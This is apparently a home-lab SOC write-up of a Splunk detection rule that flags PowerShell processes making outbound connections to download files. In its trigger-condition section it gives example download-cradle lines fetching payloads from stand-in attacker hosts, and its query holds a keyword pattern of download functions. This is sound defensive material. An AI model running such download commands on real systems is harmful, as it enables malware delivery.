# Delivery - PowerShell Script with Outbound Network Connection

## Detection Metadata

| Field | Value |
|---|---|
| Detection Type | Payload Delivery / PowerShell Abuse |
| Platform | Windows |
| Data Source | Sysmon |
| Event IDs | Event ID 1 - Process Creation, Event ID 3 - Network Connection |
| Severity | High |
| MITRE ATT&CK | T1059.001 - PowerShell |
| MITRE ATT&CK | T1105 - Ingress Tool Transfer |
| Schedule | Every 5 minutes |
| Alert Type | Scheduled Detection |
| Status | Validated |

---

# Overview

This detection identifies suspicious PowerShell activity involving outbound network communication.

Attackers commonly abuse PowerShell as a living-off-the-land technique to download malicious payloads, execute remote commands, and establish communication with attacker-controlled infrastructure.

The detection correlates PowerShell process execution with network connections and searches for commonly abused download techniques including:

- Invoke-WebRequest
- Invoke-RestMethod
- Net.WebClient
- DownloadFile
- DownloadString
- curl
- wget

This detection was validated during the Windows Attack Simulation where a PowerShell-based payload delivery technique was simulated against the Windows endpoint.

---

# Detection Objective

The objective of this detection is to identify:

- PowerShell download cradles
- Remote payload retrieval
- Suspicious PowerShell network activity
- Malware delivery attempts
- Command and control preparation activity

---

# Attack Scenario

During testing, the attacker prepared and delivered a reverse shell payload to the Windows endpoint.

Attack flow:

```
Kali Linux Attacker
        |
        |
Payload Preparation
        |
        |
PowerShell Delivery
        |
        |
Windows Endpoint
        |
        |
Outbound Network Connection
        |
        |
Splunk Detection
```

The activity generated:

```
Sysmon Event ID 1
Process Creation

Sysmon Event ID 3
Network Connection
```

---

# Data Sources

## Sysmon Event ID 1

Provides visibility into:

- Process creation
- Executable path
- User context
- Command line arguments
- Parent process

---

## Sysmon Event ID 3

Provides visibility into:

- Source IP
- Destination IP
- Destination port
- Network communication

---

Collected through:

```
Splunk Universal Forwarder
        |
        |
Splunk Enterprise
```

Index:

```
wineventlog
```

---

# SPL Detection

```spl
index=wineventlog (EventCode=1 OR EventCode=3) (Image="*\\powershell.exe" OR Image="*\\pwsh.exe")
| eval Process_Key = coalesce(ProcessGuid, ProcessId)
| eval Internal_IP = coalesce(SourceIp, SourceAddress, src_ip, c_ip)
| eval Remote_IP = coalesce(DestinationIp, DestinationAddress, dest_ip, d_ip)
| eval Remote_Port = coalesce(DestinationPort, dest_port, d_port)
| stats 
    min(_time) as Execution_Epoch
    max(_time) as Detection_Epoch
    values(Computer) as "Target Host"
    values(User) as "Executing User"
    values(Image) as "PowerShell Path"
    values(CommandLine) as "Full Command"
    values(Internal_IP) as "Local IP"
    values(Remote_IP) as "Outbound Destination IP"
    values(Remote_Port) as "Outbound Destination Port"
    by Process_Key
| where match('Full Command', "(?i)(Invoke-WebRequest|iwr|DownloadFile|DownloadString|UploadFile|WebRequest|Net\.WebClient|HttpClient|curl|wget)")
| eval "Execution Time" = strftime(Execution_Epoch, "%Y-%m-%d %H:%M:%S")
| eval "Detection Time" = strftime(Detection_Epoch, "%Y-%m-%d %H:%M:%S")
| table "Execution Time", "Detection Time", "Target Host", "Executing User", "PowerShell Path", "Full Command", "Local IP", "Outbound Destination IP", "Outbound Destination Port"
```

---

# Detection Logic Explanation

The detection performs behavioral analysis by:

### 1. Identifying PowerShell Execution

The query searches for:

```
powershell.exe
pwsh.exe
```

---

### 2. Correlating Network Activity

The detection looks for outbound connections associated with PowerShell execution.

This provides visibility into:

- Download activity
- External communication
- Payload retrieval

---

### 3. Searching for Suspicious Commands

The command line is analyzed for known download functions:

```
Invoke-WebRequest

DownloadFile

DownloadString

Net.WebClient

HttpClient

curl

wget
```

These commands are frequently abused to retrieve malware or attacker tools.

---

# Alert Configuration

## Severity

```
High
```

---

## Trigger Condition

The alert triggers when a PowerShell process performs outbound network communication and the command line contains suspicious download or transfer functionality.

Examples:

```
Invoke-WebRequest http://attacker.com/payload.exe

(New-Object Net.WebClient).DownloadFile()

curl http://malicious-site/file
```

---

## Schedule

```
Every 5 minutes
```

---

# Investigation Guidance

When this alert triggers, analysts should investigate:

---

## 1. Review PowerShell Command Line

Check:

```
Full Command
```

Determine:

- What was executed?
- Was the command encoded?
- Was a remote file downloaded?

---

## 2. Identify Destination Infrastructure

Review:

```
Outbound Destination IP
Outbound Destination Port
```

Investigate:

- Internal server
- Public IP
- Known malicious infrastructure

---

## 3. Review Parent Process

Investigate:

- explorer.exe
- cmd.exe
- winword.exe
- outlook.exe
- browser processes

Unexpected parent processes may indicate phishing or malware execution.

---

## 4. Check Downloaded Files

Look for:

- New executable files
- Temporary files
- ProgramData modifications
- User directory payloads

---

## 5. Correlate With Other Detections

Review:

- Reverse shell detection
- Registry persistence
- LSASS dumping
- Firewall events

---

# False Positives

Possible legitimate activity:

- Administrators downloading scripts
- Software deployment tools
- System management platforms
- Automation scripts

Recommended tuning:

- Whitelist approved management systems
- Monitor privileged users separately
- Review destination reputation

---

# Validation

This detection was validated during the Windows Attack Simulation.

Technique mapping:

```
T1059.001 - PowerShell

T1105 - Ingress Tool Transfer
```

Simulation:

```
Kali Linux
      |
      |
Payload Delivery
      |
      |
PowerShell Execution
      |
      |
Outbound Connection
      |
      |
Splunk Alert
```

Result:

```
Detection Triggered Successfully
```

---

# Related Playbooks

Related incident response procedures:

```
incident-response/playbooks/suspicious-powershell.md

incident-response/playbooks/malware-investigation.md

incident-response/playbooks/command-and-control.md
```

---

# Lessons Learned

PowerShell provides legitimate administrative capabilities but is frequently abused by attackers because it is already trusted within Windows environments.

Monitoring PowerShell execution together with network activity provides stronger detection capability than monitoring process creation alone.
